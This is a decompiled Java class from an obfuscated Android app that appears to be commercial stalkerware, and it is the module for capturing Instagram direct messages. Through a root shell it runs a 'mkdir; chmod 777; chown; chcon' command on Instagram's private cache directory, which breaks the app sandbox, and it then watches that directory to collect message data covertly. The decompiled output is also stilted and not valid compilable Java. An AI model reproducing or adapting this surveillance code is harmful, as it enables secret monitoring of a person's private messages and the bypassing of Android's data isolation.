package com.vvt.capture.instagram.directmessage.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class a
  implements e, m
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.e;
  private b e;
  private i f;
  private j g;
  private boolean h;
  
  private String b(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject = new java/io/File;
    ((File)localObject).<init>("/data/data/com.instagram.android/cache");
    String str1 = ((File)localObject).getAbsolutePath();
    localObject = com.vvt.capture.instagram.a.a(paramString);
    String str2 = ShellUtil.m(paramString);
    boolean bool3 = b;
    if (bool3) {}
    String str3 = "mkdir %s; chmod 777 %s; chown %s.%s %s; chcon %s %s";
    int j = 7;
    try
    {
      Object[] arrayOfObject = new Object[j];
      int k = 0;
      arrayOfObject[0] = str1;
      k = 1;
      arrayOfObject[k] = str1;
      k = 2;
      arrayOfObject[k] = localObject;
      k = 3;
      arrayOfObject[k] = localObject;
      int i = 4;
      arrayOfObject[i] = str1;
      i = 5;
      arrayOfObject[i] = str2;
      i = 6;
      arrayOfObject[i] = str1;
      localObject = String.format(str3, arrayOfObject);
      boolean bool4 = b;
      if (bool4) {}
      KMShell.a((String)localObject);
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool2;
        localShellException.printStackTrace();
      }
    }
    bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    return str1;
  }
  
  public void a(i parami)
  {
    boolean bool = b;
    if (bool) {}
    bool = true;
    this.h = bool;
    this.f = parami;
    j localj = this.g;
    if (localj == null)
    {
      localj = j.a();
      this.g = localj;
    }
    localj = this.g;
    String str = "com.instagram.android";
    localj.a(str, this);
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = b;
    if (bool) {}
    try
    {
      localb = this.e;
      if (localb != null)
      {
        bool = c;
        if (bool) {}
        localb = this.e;
        localb.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        b localb;
        bool = d;
        if (!bool) {}
      }
    }
    localb = null;
    this.e = null;
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = "/data/data/com.instagram.android/cache";
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.e;
      if (localObject2 == null)
      {
        bool2 = c;
        if (bool2) {}
        localObject2 = new com/vvt/capture/instagram/directmessage/a/b;
        ((b)localObject2).<init>(this, (String)localObject1);
        this.e = ((b)localObject2);
        localObject1 = this.e;
        ((b)localObject1).startWatching();
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = c;
      if (bool1) {}
      localObject1 = b(paramString2);
      bool2 = c;
      if (bool2) {}
      localObject2 = new com/vvt/capture/instagram/directmessage/a/b;
      ((b)localObject2).<init>(this, (String)localObject1);
      this.e = ((b)localObject2);
      localObject1 = this.e;
      ((b)localObject1).startWatching();
    }
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.h = false;
      localObject = this.e;
      if (localObject != null)
      {
        bool = b;
        if (bool) {}
        localObject = this.e;
        ((b)localObject).stopWatching();
      }
      localObject = this.g;
      if (localObject != null)
      {
        localObject = this.g;
        String str = "com.instagram.android";
        ((j)localObject).a(str);
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
  }
  
  public void b(String paramString1, String paramString2) {}
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */